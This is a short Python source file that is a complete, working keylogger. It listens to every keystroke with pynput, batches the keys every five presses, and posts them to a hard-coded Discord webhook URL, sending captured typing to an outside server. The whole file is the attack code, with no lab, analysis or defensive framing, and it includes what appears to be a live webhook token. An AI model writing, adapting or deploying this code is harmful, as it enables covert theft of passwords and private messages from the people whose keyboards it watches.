import pynput
from pynput.keyboard import Key, Listener
import requests

# Your Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1268297738458759209/YPtYYVQYg5Ee7vFWsDqon_WUKp29yQG4EWuqzv6td87O8fKu53yDtTKTVwAXP5aN2E0Q"

# This will store the logged keys
logged_keys = []

# Function to send the logged keys to the Discord webhook
def send_to_discord(log):
    data = {
        "content": log
    }
    try:
        response = requests.post(webhook_url, json=data)
        response.raise_for_status()  # Raises an exception for HTTP errors
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred: {err}")
    except Exception as err:
        print(f"An error occurred: {err}")

# Function to handle key presses
def on_press(key):
    try:
        if key == Key.space:
            key_str = " "  # Represent spacebar as a space
        elif key == Key.backspace:
            key_str = "[DELETE]"  # Represent backspace as [DELETE]
        else:
            key_str = key.char if hasattr(key, 'char') else f'[{str(key)}]'
    except AttributeError:
        key_str = f'[{str(key)}]'
    
    logged_keys.append(key_str)
    
    if len(logged_keys) >= 5:  # Send the log after every 5 key presses
        log_data = ''.join(logged_keys)
        send_to_discord(log_data)
        logged_keys.clear()

# Function to stop the listener (optional)
def on_release(key):
    if key == Key.esc:
        # Send any remaining keys before stopping
        if logged_keys:
            log_data = ''.join(logged_keys)
            send_to_discord(log_data)
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
